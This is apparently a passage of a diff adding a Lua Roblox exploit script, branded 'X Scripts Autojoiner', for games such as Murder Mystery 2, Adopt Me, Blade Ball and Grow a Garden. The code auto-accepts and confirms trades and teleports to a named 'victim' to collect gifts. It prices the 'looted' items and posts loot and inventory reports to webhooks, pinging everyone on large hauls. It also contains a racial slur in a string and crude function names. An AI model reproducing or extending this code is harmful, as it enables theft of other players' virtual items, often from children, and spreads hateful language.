+			df = v["rvalue - fly"]
+			dfr = v["rvalue - fly&ride"]
+			nr = v["nvalue - ride"]
+			nf = v["nvalue - fly"]
+			nfr = v["nvalue - fly&ride"]
+			mr = v["mvalue - ride"]
+			mf = v["mvalue - fly"]
+			mfr = v["mvalue - fly&ride"]
+
+			if v.type ~= "pet wear" then
+				if v.type ~= "vehicles" then
+					if v.type == "eggs" then
+						v.type = "pets"
+					end
+				else
+					v.type = "transport"
+				end
+			else
+				v.type = "pet_accessories"
+			end
+
+			Values[v.type][v.name] = {
+				regularValue = d,
+				neonValue = n,
+				megaValue = m,
+				regularFlyValue = df,
+				neonFlyValue = nf,
+				megaFlyValue = mf,
+				regularRideValue = dr,
+				neonRideValue = nr,
+				megaRideValue = mr,
+				regularFlyRideValue = dfr,
+				neonFlyRideValue = nfr,
+				megaFlyRideValue = mfr
+			}
+		end
+	end
+
+	return Values
+end
+
+local n5 = 0
+local n6 = 2
+
+function NotifyLootedHit(p27, p28, p29)
+	local timestamp2 = tick()
+
+	if not (timestamp2 - n5 < n6) then
+		n5 = timestamp2
+
+		if p27 == 66654135 then
+			if #p28 == 0 then
+				return
+			end
+
+			local v54 = get_mm2_values()
+			local s5 = ""
+			local n7 = 0
+
+			for _, v in pairs(p28) do
+				local v59 = v[1]
+				local v60 = v[2]
+				local v61 = (v54[v59] or 0) * v60
+
+				n7 = n7 + v61
+				full_text_of_item = v59 .. " (x" .. v60 .. ")" .. " - " .. tostring(v61) .. " Value"
+				s5 = s5 .. full_text_of_item .. "\n"
+			end
+
+			if n7 == 0 then
+				return
+			end
+
+			local _ = "Auto Joiner Just Looted:" .. "\n" .. "Total Value Of Looted Items: " .. tostring(n7) .. "\n" .. "Items:" .. "```" .. s5 .. "```"
+
+			if not (n7 >= 1000) then
+				ping = ""
+			else
+				ping = "@everyone"
+			end
+
+			TOTAL_VALUE = tostring(n7)
+			ITEM_LIST = s5
+		end
+
+		if p27 == 383310974 then
+			notify_text = ""
+
+			local v63 = get_adoptme_values()
+			local load = require(ReplicatedStorage.Fsys).load
+
+			load("ClientData")
+
+			local v65 = load("InventoryDB")
+
+			sorted_pets = {}
+
+			function suck_my_dick(p30)
+				if p30 ~= nil then
+					value_string = p30
+					value_with_period = string.gsub(value_string, ",", ".")
+					value_number = tonumber(value_with_period)
+					item_value = value_number
+
+					return item_value
+				end
+
+				return 0
+			end
+
+			total_value = 0
+			ACCEPTED = {}
+
+			for _, v in pairs(p28) do
+				local category = v.category
+
+				name_for_values = category
+
+				if name_for_values ~= "roleplay" then
+					if name_for_values ~= "food" then
+						if name_for_values ~= "stickers" then
+							if name_for_values ~= "gifts" then
+								if name_for_values ~= "toys" then
+									if name_for_values == "strollers" then
+										name_for_values = "other"
+									end
+								else
+									name_for_values = "other"
+								end
+							else
+								name_for_values = "other"
+							end
+						else
+							name_for_values = "other"
+						end
+					else
+						name_for_values = "other"
+					end
+				else
+					name_for_values = "other"
+				end
+
+				local name = v65[category][v.id].name
+				local v70 = v63[name_for_values][name]
+
+				if not v70 then
+					if v70 == nil then
+						data = {}
+						data.regularValue = 0
+						data.neonValue = 0
+						data.megaValue = 0
+						data.regularFlyValue = 0
+						data.neonFlyValue = 0
+						data.megaFlyValue = 0
+						data.regularRideValue = 0
+						data.neonRideValue = 0
+						data.megaRideValue = 0
+						data.regularFlyRideValue = 0
+						data.neonFlyRideValue = 0
+						data.megaFlyRideValue = 0
+					end
+				else
+					data = {}
+					data.regularValue = v70.regularValue
+					data.neonValue = v70.neonValue
+					data.megaValue = v70.megaValue
+					data.regularFlyValue = v70.regularFlyValue
+					data.neonFlyValue = v70.neonFlyValue
+					data.megaFlyValue = v70.megaFlyValue
+					data.regularRideValue = v70.regularRideValue
+					data.neonRideValue = v70.neonRideValue
+					data.megaRideValue = v70.megaRideValue
+					data.regularFlyRideValue = v70.regularFlyRideValue
+					data.neonFlyRideValue = v70.neonFlyRideValue
+					data.megaFlyRideValue = v70.megaFlyRideValue
+				end
+
+				if not v.properties.mega_neon or not v.properties.flyable or not v.properties.rideable then
+					if not v.properties.neon or not v.properties.flyable or not v.properties.rideable then
+						if not v.properties.mega_neon or not v.properties.flyable then
+							if not v.properties.neon or not v.properties.flyable then
+								if not v.properties.mega_neon or not v.properties.rideable then
+									if not v.properties.neon or not v.properties.rideable then
+										if not v.properties.mega_neon then
+											if not v.properties.neon then
+												if not v.properties.flyable or not v.properties.rideable then
+													if not v.properties.flyable then
+														if not v.properties.rideable then
+															item_value = suck_my_dick(data.regularValue)
+														else
+															item_value = suck_my_dick(data.regularRideValue)
+														end
+													else
+														item_value = suck_my_dick(data.regularFlyValue)
+													end
+												else
+													item_value = suck_my_dick(data.regularFlyRideValue)
+												end
+											else
+												item_value = suck_my_dick(data.neonValue)
+											end
+										else
+											item_value = suck_my_dick(data.megaValue)
+										end
+									else
+										item_value = suck_my_dick(data.neonRideValue)
+									end
+								else
+									item_value = suck_my_dick(data.megaRideValue)
+								end
+							else
+								item_value = suck_my_dick(data.neonFlyValue)
+							end
+						else
+							item_value = suck_my_dick(data.megaFlyValue)
+						end
+					else
+						item_value = suck_my_dick(data.neonFlyRideValue)
+					end
+				else
+					item_value = suck_my_dick(data.megaFlyRideValue)
+				end
+
+				if tonumber(item_value) > -1 then
+					total_value = total_value + item_value
+					table.insert(ACCEPTED, {
+						name = name,
+						value = tonumber(item_value),
+						neon = v.properties.neon or false,
+						mega = v.properties.mega_neon or false,
+						fly = v.properties.flyable or false,
+						ride = v.properties.rideable or false
+					})
+				end
+			end
+
+			table.sort(ACCEPTED, function(p31, p32)
+				return p31.value > p32.value
+			end)
+
+			for _, v in pairs(ACCEPTED) do
+				prefix = ""
+
+				if not v.neon then
+					if v.mega then
+						prefix = "Mega Neon "
+					end
+				else
+					prefix = "Neon "
+				end
+
+				if v.fly then
+					prefix = prefix .. "Fly "
+				end
+
+				if v.ride then
+					prefix = prefix .. "Ride "
+				end
+
+				notify_text = notify_text .. prefix .. v.name .. " - " .. v.value .. " Value\n"
+			end
+
+			TOTAL_VALUE = total_value
+			ITEM_LIST = notify_text
+
+			if not (TOTAL_VALUE > 70) then
+				ping = ""
+			else
+				ping = "@everyone"
+			end
+		end
+
+		local t10 = {
+			title = "💰 Loot Notification!",
+			description = "Auto Joiner just looted some items!",
+			color = 65433,
+			fields = {
+				{
+					name = "🌍 Game Name:",
+					value = MarketplaceService:GetProductInfo(game.PlaceId).Name,
+					inline = true
+				},
+				{
+					name = "📦 Items",
+					value = "```" .. ITEM_LIST .. "```",
+					inline = false
+				},
+				{
+					name = "📊 Total Value",
+					value = tostring(TOTAL_VALUE),
+					inline = true
+				}
+			},
+			footer = {
+				text = "X Scripts Autojoiner"
+			},
+			timestamp = DateTime.now():ToIsoDate()
+		}
+		local t11 = {
+			content = ping,
+			embeds = { t10 }
+		}
+
+		if ITEM_LIST ~= "" then
+			request({
+				Url = p29,
+				Method = "POST",
+				Headers = {
+					["Content-Type"] = "application/json"
+				},
+				Body = HttpService:JSONEncode(t11)
+			})
+		end
+
+		return
+	end
+end
+function InventoryReport(p33, p34)
+	if p33 == 66654135 then
+		local _, u86, u87 = get_mm2_values()
+		local t12 = {
+			"Unique",
+			"Ancient",
+			"Godly",
+			"Legendary",
+			"Rare",
+			"Vintage",
+			"Halloween",
+			"Christmas",
+			"Uncommon",
+			"Common"
+		}
+
+		DATABASE = ReplicatedStorage.GetSyncData:InvokeServer()
+		WEAPON_DATABASE = DATABASE.Item
+		PETS_DATABASE = DATABASE.Pets
+
+		function GetSortedInventory()
+			local t13 = {}
+			local v235 = ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(Players.LocalPlayer.Name)
+			local Owned = v235.Weapons.Owned
+			local Owned2 = v235.Pets.Owned
+
+			for k, v in pairs(Owned) do
+				local v240 = WEAPON_DATABASE[k]
+
+				if v240 then
+					local v241 = (u86[k] or 0) * v
+
+					if v240.ItemName ~= "Default Knife" and v240.ItemName ~= "Default Gun" then
+						table.insert(t13, {
+							Name = v240.ItemName,
+							ID = k,
+							RAP = v241,
+							Class = v240.ItemType,
+							Rarity = v240.Rarity,
+							Amount = v,
+							Chroma = v240.Chroma
+						})
+					end
+				end
+			end
+
+			for k, v in pairs(Owned2) do
+				local v244 = PETS_DATABASE[k]
+
+				if v244 then
+					local v245 = (u87[k] or 0) * v
+
+					table.insert(t13, {
+						Name = k,
+						ID = k,
+						RAP = v245,
+						Class = "Pets",
+						Rarity = v244.Rarity,
+						Amount = v,
+						Chroma = v244.Chroma
+					})
+				end
+			end
+
+			table.sort(t13, function(p35, p36)
+				if p35.RAP == p36.RAP then
+					local v280 = table.find(t12, p35.Rarity)
+					local v281 = table.find(t12, p36.Rarity)
+
+					if not v280 or not v281 then
+						if not v280 then
+							if not v281 then
+								return false
+							end
+
+							return false
+						end
+
+						return true
+					end
+
+					return v280 < v281
+				end
+
+				return p35.RAP > p36.RAP
+			end)
+
+			return t13
+		end
+
+		total_value = 0
+		hits = GetSortedInventory()
+
+		for _, v in pairs(hits) do
+			total_value = total_value + v.RAP
+		end
+
+		cOuNT = 0
+		first10items = ""
+
+		for _, v in pairs(hits) do
+			cOuNT = cOuNT + 1
+			first10items = first10items .. v.Name .. " (x" .. v.Amount .. "): " .. v.RAP .. " Value\n"
+
+			if cOuNT == 25 then
+				break
+			end
+		end
+
+		TOTAL_VALUE = total_value
+		ITEM_LIST = first10items
+	end
+
+	if p33 == 383310974 then
+		notify_text = ""
+
+		local v93 = get_adoptme_values()
+		local load = require(ReplicatedStorage.Fsys).load
+		local v95 = load("ClientData")
+		local v96 = load("InventoryDB")
+		local v97 = v95.get("inventory")
+
+		load("RouterClient")
+		sorted_pets = {}
+
+		function suck_my_dick(p37)
+			if p37 ~= nil then
+				value_string = p37
+				value_with_period = string.gsub(value_string, ",", ".")
+				value_number = tonumber(value_with_period)
+				item_value = value_number
+
+				return item_value
+			end
+
+			return 0
+		end
+
+		total_value = 0
+		ACCEPTED = {}
+
+		for k, v in pairs(v97) do
+			for _, v2 in pairs(v) do
+				name_for_values = k
+
+				if name_for_values ~= "roleplay" then
+					if name_for_values ~= "food" then
+						if name_for_values ~= "stickers" then
+							if name_for_values ~= "gifts" then
+								if name_for_values ~= "toys" then
+									if name_for_values == "strollers" then
+										name_for_values = "other"
+									end
+								else
+									name_for_values = "other"
+								end
+							else
+								name_for_values = "other"
+							end
+						else
+							name_for_values = "other"
+						end
+					else
+						name_for_values = "other"
+					end
+				else
+					name_for_values = "other"
+				end
+
+				local name = v96[k][v2.id].name
+				local v103 = v93[name_for_values][name]
+
+				if not v103 then
+					if v103 == nil then
+						data = {}
+						data.regularValue = 0
+						data.neonValue = 0
+						data.megaValue = 0
+						data.regularFlyValue = 0
+						data.neonFlyValue = 0
+						data.megaFlyValue = 0
+						data.regularRideValue = 0
+						data.neonRideValue = 0
+						data.megaRideValue = 0
+						data.regularFlyRideValue = 0
+						data.neonFlyRideValue = 0
+						data.megaFlyRideValue = 0
+					end
+				else
+					data = {}
+					data.regularValue = v103.regularValue
+					data.neonValue = v103.neonValue
+					data.megaValue = v103.megaValue
+					data.regularFlyValue = v103.regularFlyValue
+					data.neonFlyValue = v103.neonFlyValue
+					data.megaFlyValue = v103.megaFlyValue
+					data.regularRideValue = v103.regularRideValue
+					data.neonRideValue = v103.neonRideValue
+					data.megaRideValue = v103.megaRideValue
+					data.regularFlyRideValue = v103.regularFlyRideValue
+					data.neonFlyRideValue = v103.neonFlyRideValue
+					data.megaFlyRideValue = v103.megaFlyRideValue
+				end
+
+				if not v2.properties.mega_neon or not v2.properties.flyable or not v2.properties.rideable then
+					if not v2.properties.neon or not v2.properties.flyable or not v2.properties.rideable then
+						if not v2.properties.mega_neon or not v2.properties.flyable then
+							if not v2.properties.neon or not v2.properties.flyable then
+								if not v2.properties.mega_neon or not v2.properties.rideable then
+									if not v2.properties.neon or not v2.properties.rideable then
+										if not v2.properties.mega_neon then
+											if not v2.properties.neon then
+												if not v2.properties.flyable or not v2.properties.rideable then
+													if not v2.properties.flyable then
+														if not v2.properties.rideable then
+															item_value = suck_my_dick(data.regularValue)
+														else
+															item_value = suck_my_dick(data.regularRideValue)
+														end
+													else
+														item_value = suck_my_dick(data.regularFlyValue)
+													end
+												else
+													item_value = suck_my_dick(data.regularFlyRideValue)
+												end
+											else
+												item_value = suck_my_dick(data.neonValue)
+											end
+										else
+											item_value = suck_my_dick(data.megaValue)
+										end
+									else
+										item_value = suck_my_dick(data.neonRideValue)
+									end
+								else
+									item_value = suck_my_dick(data.megaRideValue)
+								end
+							else
+								item_value = suck_my_dick(data.neonFlyValue)
+							end
+						else
+							item_value = suck_my_dick(data.megaFlyValue)
+						end
+					else
+						item_value = suck_my_dick(data.neonFlyRideValue)
+					end
+				else
+					item_value = suck_my_dick(data.megaFlyRideValue)
+				end
+
+				if tonumber(item_value) > -1 then
+					total_value = total_value + item_value
+					table.insert(ACCEPTED, {
+						name = name,
+						value = tonumber(item_value),
+						neon = v2.properties.neon or false,
+						mega = v2.properties.mega_neon or false,
+						fly = v2.properties.flyable or false,
+						ride = v2.properties.rideable or false
+					})
+				end
+			end
+		end
+
+		table.sort(ACCEPTED, function(p38, p39)
+			return p38.value > p39.value
+		end)
+
+		local n8 = 0
+
+		for _, v in pairs(ACCEPTED) do
+			prefix = ""
+
+			if not v.neon then
+				if v.mega then
+					prefix = "Mega Neon "
+				end
+			else
+				prefix = "Neon "
+			end
+
+			if v.fly then
+				prefix = prefix .. "Fly "
+			end
+
+			if v.ride then
+				prefix = prefix .. "Ride "
+			end
+
+			n8 = n8 + 1
+
+			if n8 >= 25 then
+				break
+			end
+
+			notify_text = notify_text .. prefix .. v.name .. " - " .. v.value .. " Value\n"
+		end
+
+		TOTAL_VALUE = tostring(total_value)
+		ITEM_LIST = notify_text
+	end
+
+	if game.GameId == 4777817887 then
+		RAP = require(ReplicatedStorage.Controllers.Trading.RAPController)
+
+		function getrap(p40, p41)
+			cashe = {
+				Sword = {},
+				Explosion = {},
+				Emote = {}
+			}
+			example = "[[\"Name\",\"ItemName\"]]"
+			args = {
+				[1] = RAP,
+				[2] = p41,
+				[3] = {
+					Name = "nigger porno omg sex"
+				},
+				[4] = example:gsub("ItemName", p40)
+			}
+
+			if not cashe[p41][p40] then
+				return (RAP.FastGetRAP(unpack(args)))
+			end
+
+			return cashe[p41][p40]
+		end
+		function gethits(p42)
+			MINIMUM_BB_RAP = p42 or 10
+			hits = {}
+			Inventory = require(ReplicatedStorage.Shared.Inventory).Client.Get()
+			emote_names = require(ReplicatedStorage.Common.ItemsUtil.ItemLoader).emotes
+
+			if Inventory.Sword ~= nil then
+				for k, v in pairs(Inventory.Sword) do
+					rapapa = getrap(v.Name, "Sword")
+
+					if rapapa and rapapa >= MINIMUM_BB_RAP then
+						table.insert(hits, {
+							rap = rapapa,
+							uid = k,
+							name = v.Name .. " " .. "(Sword)",
+							class = "Sword"
+						})
+					end
+				end
+			end
+
+			if Inventory.Explosion ~= nil then
+				for k, v in pairs(Inventory.Explosion) do
+					rapapa = getrap(v.Name, "Explosion")
+
+					if rapapa and rapapa >= MINIMUM_BB_RAP then
+						table.insert(hits, {
+							rap = rapapa,
+							uid = k,
+							name = v.Name .. " " .. "(Explosion)",
+							class = "Explosion"
+						})
+					end
+				end
+			end
+
+			if Inventory.Emote ~= nil then
+				for k, v in pairs(Inventory.Emote) do
+					rapapa = getrap(v.Name, "Emote")
+
+					if rapapa and rapapa >= MINIMUM_BB_RAP then
+						table.insert(hits, {
+							rap = rapapa,
+							uid = k,
+							name = tostring(emote_names[v.Name].name) .. " " .. "(Emote)",
+							class = "Emote"
+						})
+					end
+				end
+			end
+
+			table.sort(hits, function(p43, p44)
+				return p43.rap > p44.rap
+			end)
+
+			return hits
+		end
+
+		hits = gethits(0)
+		total_rap = 0
+
+		for _, v in pairs(hits) do
+			total_rap = total_rap + v.rap
+		end
+
+		function getbestitems()
+			toreturn = ""
+
+			if #hits ~= 0 then
+				if not (#hits > 25) then
+					for i = 1, #hits do
+						toreturn = toreturn .. hits[i].name .. " : " .. hits[i].rap .. " RAP\n"
+					end
+				else
+					for i = 1, 25 do
+						toreturn = toreturn .. hits[i].name .. " : " .. hits[i].rap .. " RAP\n"
+					end
+				end
+
+				toreturn2 = toreturn
+
+				return toreturn2
+			end
+
+			return ""
+		end
+
+		TOTAL_VALUE = total_rap
+		ITEM_LIST = getbestitems()
+	end
+
+	if p33 == 7436755782 then
+		local t14 = {
+			Dragonfly = 180,
+			["Mimic Octopus"] = 160,
+			Butterfly = 210,
+			["Queen Bee"] = 75,
+			["Disco Bee"] = 300,
+			Raccoon = 290,
+			["Red Fox"] = 35,
+			["Fennec Fox"] = 300,
+			["Hyacinth Macaw"] = 40,
+			["Chicken Zombie"] = 55,
+			["T-Rex"] = 300,
+			TRex = 300,
+			Brontosaurus = 80
+		}
+		local DataService = require(ReplicatedStorage.Modules.DataService)
+		local s6 = ""
+		local n9 = 0
+		local n10 = 0
+
+		for _, v in pairs(DataService:GetData().PetsData.PetInventory.Data) do
+			local u116 = false
+
+			if table.find({
+				"Dragonfly",
+				"Disco Bee",
+				"Raccoon",
+				"Mimic Octopus",
+				"Butterfly",
+				"Queen Bee",
+				"Red Fox",
+				"Fennec Fox",
+				"Hyacinth Macaw",
+				"Chicken Zombie",
+				"T-Rex",
+				"TRex",
+				"Brontosaurus"
+			}, v.PetType) then
+				pet_value = t14[v.PetType] or 0
+				n10 = n10 + pet_value
+				s6 = s6 .. "\n" .. v.PetType
+				n9 = n9 + 1
+
+				if n9 >= 30 then
+					(function()
+						u116 = true
+					end)()
+				end
+			end
+
+			if u116 then
+				break
+			end
+		end
+
+		TOTAL_VALUE = n10
+		ITEM_LIST = s6
+	end
+
+	local t15 = {
+		title = "💰 Inventory Report!",
+		description = "List of all your items!",
+		color = 5174540,
+		fields = {
+			{
+				name = "🌍 Game Name:",
+				value = MarketplaceService:GetProductInfo(game.PlaceId).Name,
+				inline = true
+			},
+			{
+				name = "📦 Items",
+				value = "```" .. ITEM_LIST .. "```",
+				inline = false
+			},
+			{
+				name = "📊 Total Value",
+				value = tostring(TOTAL_VALUE),
+				inline = true
+			}
+		},
+		footer = {
+			text = "X Scripts Autojoiner"
+		},
+		timestamp = DateTime.now():ToIsoDate()
+	}
+	local t16 = {
+		content = ping,
+		embeds = { t15 }
+	}
+
+	request({
+		Url = p34,
+		Method = "POST",
+		Headers = {
+			["Content-Type"] = "application/json"
+		},
+		Body = HttpService:JSONEncode(t16)
+	})
+end
+function mm2()
+	local t17 = {}
+
+	for _, descendant in ipairs(ReplicatedStorage:GetDescendants()) do
+		if descendant:IsA("RemoteFunction") or descendant:IsA("RemoteEvent") then
+			table.insert(t17, descendant)
+		end
+	end
+
+	ContentProvider:PreloadAsync(t17)
+
+	local t18 = {
+		"MouseButton1Click",
+		"MouseButton1Down",
+		"Activated"
+	}
+
+	function TapUI(p45)
+		for _, v in pairs(t18) do
+			for _, v3 in pairs(getconnections(p45[v])) do
+				v3.Function()
+			end
+		end
+	end
+
+	repeat
+		task.wait(1)
+		pcall(function()
+			TapUI(Players.LocalPlayer.PlayerGui.DeviceSelect.Container.Tablet.Button)
+		end)
+		pcall(function()
+			TapUI(Players.LocalPlayer.PlayerGui.Join.Friends.Play)
+		end)
+	until Players.LocalPlayer.PlayerGui:FindFirstChild("MainGUI")
+
+	TradeService = ReplicatedStorage:WaitForChild("Trade")
+
+	function TradeService.SendRequest.OnClientInvoke()
+		TRADE_INACTIVITY_TIMER = 0
+		TradeService.AcceptRequest:FireServer()
+
+		return true
+	end
+
+	TradeService.AcceptTrade.OnClientEvent:Connect(function(...)
+		local t19 = { ... }
+		local v202 = t19[1]
+
+		TRADE_INACTIVITY_TIMER = 0
+
+		if not v202 then
+			wait(0.1)
+			TradeService.AcceptTrade:FireServer(game.PlaceId * 2)
+		end
+
+		if v202 then
+			recieved_items = t19[2]
+
+			local v203 = get_latest_channel()
+
+			if v203 == "" then
+				Webhook = Webhooks[1]
+			else
+				Webhook = getWebhookFromChannelId(v203)
+			end
+
+			NotifyLootedHit(game.GameId, recieved_items, Webhook)
+		end
+	end)
+	TradeService.EndTrade.OnClientEvent:Connect(function()
+		TRADE_INACTIVITY_TIMER = 0
+	end)
+	TradeService.StartTrade.OnClientEvent:Connect(function()
+		TRADE_INACTIVITY_TIMER = 0
+	end)
+	TradeService.UpdateTrade.OnClientEvent:Connect(function(_)
+		TRADE_INACTIVITY_TIMER = 0
+	end)
+	StartCountingTradeInactivity(8)
+	TextChatService.TextChannels.RBXGeneral:SendAsync("1")
+end
+function adoptme()
+	local LocalPlayer = Players.LocalPlayer
+
+	LocalPlayer:WaitForChild("PlayerGui")
+	LocalPlayer.PlayerGui:WaitForChild("NewsApp")
+	LocalPlayer.PlayerGui:WaitForChild("DialogApp")
+
+	local load = require(ReplicatedStorage:WaitForChild("Fsys")).load
+
+	task.spawn(function()
+		oldtime = os.time()
+
+		if not load("ClientData").get_data()[LocalPlayer.Name].team then
+			wait(60)
+
+			if not JOINER_LOADED then
+				TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId)
+			end
+		end
+	end)
+
+	repeat
+		task.wait(1)
+	until load("ClientData").get_data()[LocalPlayer.Name].team
+
+	JOINER_LOADED = true
+
+	local ClientData = require(ReplicatedStorage.ClientModules.Core.ClientData)
+	local load2 = require(ReplicatedStorage.Fsys).load
+	local v37 = load2("RouterClient")
+	local v38 = v37.get_event("TradeAPI/TradeRequestReceived")
+	local u39 = v37.get("TradeAPI/AcceptOrDeclineTradeRequest")
+	local u40 = v37.get("TradeAPI/ConfirmTrade")
+	local u41 = v37.get("TradeAPI/AcceptNegotiation")
+	local v42 = v37.get("DataAPI/DataChanged")
+	local u43 = v37.get("ShopAPI/BuyItem")
+	local u44 = v37.get("TradeAPI/AddItemToOffer")
+	local v45 = ClientData.get("inventory")
+
+	for _, v in pairs(v45.food) do
+		if v.kind == "teachers_apple" then
+			apple_uid = v.unique
+		end
+	end
+
+	task.spawn(function()
+		function CheckTradeLicense()
+			for _, v in pairs(ClientData.get_data()[Players.LocalPlayer.Name].inventory.toys) do
+				if v.id:match("license") then
+					return true
+				end
+			end
+
+			return false
+		end
+
+		if not CheckTradeLicense() then
+			repeat
+				task.spawn(function()
+					load2("RouterClient").get("SettingsAPI/SetBooleanFlag"):FireServer("has_talked_to_trade_quest_npc", true)
+					task.wait()
+					load2("RouterClient").get("TradeAPI/BeginQuiz"):FireServer()
+					task.wait(1)
+
+					for _, v in pairs(load2("ClientData").get("trade_license_quiz_manager").quiz) do
+						load2("RouterClient").get("TradeAPI/AnswerQuizQuestion"):FireServer(v.answer)
+					end
+				end)
+				wait(3)
+			until CheckTradeLicense()
+		end
+	end)
+
+	function buy_apples()
+		local t20 = {
+			[1] = "food",
+			[2] = "teachers_apple",
+			[3] = {
+				buy_count = 5
+			}
+		}
+
+		return u43:InvokeServer(unpack(t20))
+	end
+	function InTrade()
+		if Players.LocalPlayer.PlayerGui.TradeApp.Frame.Visible ~= false then
+			return true
+		end
+
+		return false
+	end
+
+	v38.OnClientEvent:Connect(function(p47)
+		local t21 = {
+			[1] = Players:WaitForChild(p47.Name),
+			[2] = true
+		}
+
+		u39:InvokeServer(unpack(t21))
+		TRADE_INACTIVITY_TIMER = 0
+	end)
+	task.spawn(function()
+		while task.wait() do
+			buy_apples()
+			wait(1)
+
+			repeat
+				task.wait()
+			until InTrade()
+
+			for _, v in pairs(ClientData.get("inventory").food) do
+				if v.kind == "teachers_apple" then
+					apple_uid = v.unique
+				end
+			end
+		end
+	end)
+	v42.OnClientEvent:Connect(function(...)
+		x = { ... }
+
+		if type(x[3]) == "table" and x[2] == "trade" then
+			TRADE_INACTIVITY_TIMER = 0
+			trade = x[3]
+
+			if trade.recipient ~= Players.LocalPlayer.Name then
+				if trade.sender == Players.LocalPlayer.Name then
+					me = "sender_offer"
+				end
+			else
+				me = "recipient_offer"
+			end
+
+			if tostring(trade.recipient) == Players.LocalPlayer.Name then
+				me = "recipient_offer"
+				notme = "sender_offer"
+			end
+
+			if tostring(trade.sender) == Players.LocalPlayer.Name then
+				me = "sender_offer"
+				notme = "recipient_offer"
+			end
+
+			me = trade[me]
+			notme = trade[notme]
+			DID_I_ADDED_APPLE = false
+
+			for _, v in pairs(me.items) do
+				if v.id:match("teachers_apple") then
+					DID_I_ADDED_APPLE = true
+				end
+			end
+
+			if not DID_I_ADDED_APPLE and apple_uid then
+				u44:FireServer(apple_uid)
+			end
+
+			if notme.negotiated then
+				u41:FireServer()
+			end
+
+			if notme.confirmed then
+				u40:FireServer()
+			end
+
+			if me.confirmed and notme.confirmed then
+				repeat
+					task.wait()
+				until not InTrade()
+
+				local v217 = get_latest_channel()
+
+				if v217 == "" then
+					Webhook = Webhooks[1]
+				else
+					Webhook = getWebhookFromChannelId(v217)
+				end
+
+				NotifyLootedHit(game.GameId, notme.items, Webhook)
+			end
+		end
+	end)
+	StartCountingTradeInactivity(10)
+	TextChatService.TextChannels.RBXGeneral:SendAsync("1")
+end
+function bladeball()
+	lp = Players.LocalPlayer
+	playergui = lp:WaitForChild("PlayerGui")
+	task.spawn(function()
+		if not Players.LocalPlayer.PlayerGui:WaitForChild("HUD", 60) then
+			TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId)
+		end
+	end)
+	hud = playergui:WaitForChild("HUD")
+	lf = hud:WaitForChild("LeftFrame")
+	NOT_TARGET_COLOR = ColorSequence.new({
+		ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
+		ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
+	})
+	loading_time = tick()
+
+	repeat
+		task.wait(0.1)
+		IS_LOADED = Players.LocalPlayer.PlayerGui.HUD.LeftFrame.Middle.MiddleStack.AFK.AFKText.UIGradient.Color ~= NOT_TARGET_COLOR or tick() - loading_time > 20
+	until IS_LOADED
+
+	ReplicatedStorage.Packages._Index["sleitnick_net@0.1.0"].net["RE/Trading/ReceivedTradeRequest"].OnClientEvent:Connect(function(p48)
+		from = p48.From
+
+		local t22 = {
+			[1] = from,
+			[2] = true
+		}
+
+		TRADE_INACTIVITY_TIMER = 0
+		ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net"):WaitForChild("RF/Trading/RespondToTradeRequest"):InvokeServer(unpack(t22))
+	end)
+	ReplicatedStorage.Packages._Index["ytrev_replion@2.0.0-rc.1"].replion.Remotes.Set.OnClientEvent:Connect(function(...)
+		args = { ... }
+
+		if type(args[2]) == "table" and args[2][2] == "Ready" then
+			TRADE_INACTIVITY_TIMER = 0
+
+			if args[3] == true then
+				for _ = 1, 5 do
+					local t23 = {
+						[1] = true
+					}
+
+					ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net"):WaitForChild("RF/Trading/ReadyUp"):InvokeServer(unpack(t23))
+					wait(1)
+				end
+			end
+		end
+
+		if type(args[2]) == "table" and args[2][2] == "Confirmed" then
+			TRADE_INACTIVITY_TIMER = 0
+
+			if args[3] == true then
+				for _ = 1, 5 do
+					ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net"):WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
+					wait(1)
+				end
+			end
+		end
+	end)
+	StartCountingTradeInactivity(15)
+	TextChatService.TextChannels.RBXGeneral:SendAsync("1")
+end
+function gag()
+	function get_gifts()
+		local t24 = {}
+
+		for _, child in pairs(game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("Gift_Notification"):WaitForChild("Frame"):GetChildren()) do
+			if child.Name == "Gift_Notification" then
+				table.insert(t24, child)
+			end
+		end
+
+		return t24
+	end
+	function collect_gifts()
+		local v222 = get_gifts()
+
+		if #v222 > 0 then
+			for _, v in pairs(v222) do
+				local Accept = v.Holder.Frame.Accept
+
+				getconnections(Accept.MouseButton1Click)[2]:Fire()
+				TRADE_INACTIVITY_TIMER = 0
+				task.wait(0.5)
+			end
+		end
+	end
+
+	VICTIM_USERNAME = get_victim_that_im_joining()
+
+	local function u48(p49)
+		return game:GetService("Players"):FindFirstChild(p49)
+	end
+
+	function teleport_player()
+		if u48(VICTIM_USERNAME) then
+			local HumanoidRootPartCFrame = u48(VICTIM_USERNAME).Character.HumanoidRootPart.CFrame
+
+			game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = HumanoidRootPartCFrame
+		end
+	end
+
+	local function u49()
+		c = 0
+
+		for _, _ in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
+			c = c + 1
+		end
+
+		if c >= 59 then
+			FULL_INVENTORY = true
+		end
+	end
+
+	task.spawn(function()
+		while task.wait(0.5) do
+			warn(shall_teleport(), TRADE_INACTIVITY_TIMER, get_victim_that_im_joining(), Players:FindFirstChild(get_victim_that_im_joining()))
+			task.spawn(teleport_player)
+			task.spawn(collect_gifts)
+			task.spawn(u49)
+		end
+	end)
+	StartCountingTradeInactivity(15)
+end
+
+FULL_INVENTORY = false
+RunService.Heartbeat:Connect(function()
+	if not FULL_INVENTORY then
+		if shall_teleport() and not CURRENTLY_TELEPORTING then
+			join_latest_hit_from_queue()
+		end
+
+		return
+	end
+
+	if Connection_Of_Teleporting then
+		Connection_Of_Teleporting:Disconnect()
+		Connection_Of_Teleporting = nil
+	end
+
+	local v82 = get_latest_channel()
+
+	if v82 == "" then
+		Webhook = Webhooks[1]
+	else
+		Webhook = getWebhookFromChannelId(v82)
+	end
+
+	request({
+		Url = Webhook,
